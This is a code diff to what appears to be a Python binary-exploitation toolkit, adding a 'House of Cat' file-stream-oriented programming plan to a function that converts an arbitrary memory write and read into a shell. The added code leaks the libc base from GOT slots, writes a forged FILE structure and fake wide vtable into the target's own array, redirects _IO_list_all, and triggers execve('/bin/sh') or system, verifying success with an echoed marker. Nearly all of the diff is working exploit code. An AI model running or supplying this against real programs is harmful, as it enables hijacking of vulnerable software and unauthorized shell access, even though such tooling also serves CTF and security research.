@@ -2575,9 +2575,9 @@ def _int_candidates(out: bytes) -> list:
 
 
 def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_slots,
-                       scratch: int, exit_seqs=(b"q\n",), marker: bytes = _WWW_MARKER,
-                       plans=("setcontext", "system"), timeout: float = 14.0, base_argv=(),
-                       mem_mb: int = 2048) -> dict:
+                       scratch: int, scratch_size: int = 0, exit_seqs=(b"q\n",),
+                       marker: bytes = _WWW_MARKER, plans=("setcontext", "system", "cat"),
+                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048) -> dict:
     """Turn a one-word-at-a-time ARBITRARY WRITE (plus the arbitrary READ that usually comes with
     it) into a spawned shell, with no win function and no `system` in the target's PLT.
 
@@ -2603,11 +2603,18 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                       control, used here for `execve("/bin/sh", NULL, NULL)`.
       "system"     -- `heap.house_of_apple2_cells`: the fake `__doallocate` is `system` and the
                       FILE's `_flags` doubles as the command string.
+      "cat"        -- `heap.build_house_of_cat`: do not forge a FILE glibc owns at all. Write the
+                      whole FILE, its `_IO_wide_data` and its fake `_wide_vtable` into `scratch`,
+                      then write ONE pointer, `_IO_list_all := scratch`. Needs
+                      `scratch_size >= heap.CAT_BLOB_MIN`, and takes the setcontext finish when
+                      the libc has one.
 
     setcontext goes first because `execve` beats `system(" /bin/sh")` on both counts that matter
     here: it needs none of the ~2 KB of stack `system` wants under the pivoted rsp (which lands in
     libc's `.data`), and it does not need the command to survive in a field that is also a
-    bitfield.
+    bitfield. `cat` goes last despite being the fewest writes and needing the FEWEST leaks (no
+    `_wide_data` read-back, no `_flags` read): the blob lands in the target's own array, which is
+    the object the bug indexes, so it is the plan that disturbs the running program most.
 
     `write_cell(addr, value) -> bytes` and `read_cell(addr) -> bytes` render the target's own input
     for one write / one read; `leak_slots` is [(got_address, libc_symbol_name)] in try order;
@@ -2620,8 +2627,12 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
     usable = [(a, n) for a, n in leak_slots if n in syms]
     if not usable:
         return {"ok": False, "reason": "no GOT slot names a symbol the linked libc exports"}
+    cat_finish = "setcontext" if _heap.house_of_cat_targets(libc_data, "setcontext") else "system"
     targets = {"setcontext": _heap.setcontext_fsop_targets(libc_data),
-               "system": _heap.house_of_apple2_cell_targets(libc_data)}
+               "system": _heap.house_of_apple2_cell_targets(libc_data),
+               "cat": _heap.house_of_cat_targets(libc_data, cat_finish)}
+    if int(scratch_size or 0) < _heap.CAT_BLOB_MIN:
+        targets["cat"] = {}                            # no room for the blob beside the bug
     runnable = [k for k in plans if targets.get(k)]
     if not runnable:
         return {"ok": False, "reason": "the linked libc supports no FSOP plan "
@@ -2665,6 +2676,42 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
             if not base:
                 return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
                                                "(the slot may still be unresolved / lazily bound)"}
+            if plan == "cat":
+                kw = {"wfile_jumps": base + T["wfile_jumps"], "plan": T["plan"],
+                      "size": _heap.CAT_BLOB_MIN}
+                if T["plan"] == "setcontext":
+                    kw.update(setcontext=base + T["setcontext"], fields=T["fields"],
+                              rip_at=T["rip_at"], rip=base + T["execve"],
+                              rdi=base + T["binsh"], rsi=0, rdx=0)
+                else:
+                    kw["system"] = base + T["system"]
+                blob = _heap.build_house_of_cat(scratch, **kw)
+                # Only the non-zero words: the array the bug indexes starts zeroed, and every
+                # write is a round trip through the target's own prompts.
+                cells = [(scratch + o, struct.unpack("<Q", blob[o:o + 8])[0])
+                         for o in range(0, len(blob), 8)
+                         if struct.unpack("<Q", blob[o:o + 8])[0]]
+                cells.append((base + T["list_all"], scratch))
+                shown = [(hex(a), hex(v)) for a, v in cells]
+                for addr, val in cells:
+                    _op(write_cell(addr, val))
+                    if val not in _read(addr):
+                        return {"ok": False, "libc_base": base, "cells": shown,
+                                "reason": f"cell {addr:#x} := {val:#x} did not read back; the "
+                                          "write primitive does not reach that address"}
+                for seq in (tuple(exit_seqs) or (b"",)):
+                    out = _op(seq, 0.6) if seq else b""
+                    out += _op(b"echo " + marker + b"\n", 1.2)
+                    if marker in out:
+                        return {"ok": True, "libc_base": base, "fp": scratch, "cells": shown,
+                                "fp_name": "a FILE of our own in the target's array",
+                                "exit_seq": seq, "finish": T["plan"],
+                                "targets": {k: v for k, v in T.items() if k != "fp_name"}}
+                    if p.poll() is not None:
+                        break
+                return {"ok": False, "libc_base": base, "cells": shown,
+                        "reason": f"_IO_list_all := {scratch:#x} and the blob landed, but no "
+                                  f"trigger spawned a shell (exit {p.poll()!r})"}
             fp = base + T["fp"]
             wide = next((v for v in _read(fp + T["wide_data_field"])
                          if base <= v < base + 0x600000), None)
